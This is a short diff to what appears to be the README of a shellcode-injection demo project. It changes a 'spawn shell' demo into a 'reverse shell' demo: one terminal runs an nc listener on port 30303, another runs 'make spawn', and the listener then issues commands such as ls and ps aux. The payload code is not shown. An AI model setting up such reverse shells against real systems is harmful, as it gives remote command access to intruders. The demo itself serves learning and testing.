@@ -103,11 +103,15 @@ make test
 #debug: disassembly, segment inspection, strace
 make debug
 
-# Spawn shell demo:
-# on terminal 1
+#reverse shell demo:
+#on terminal 1
 nc -lvp 30303
-# on terminal 2
+#on terminal 2 in the root of tree
 make spawn
+#on terminal 1 try:
+ls
+cat /proc/cpuinfo
+ps aux
 ```
 
 ### Manual injection
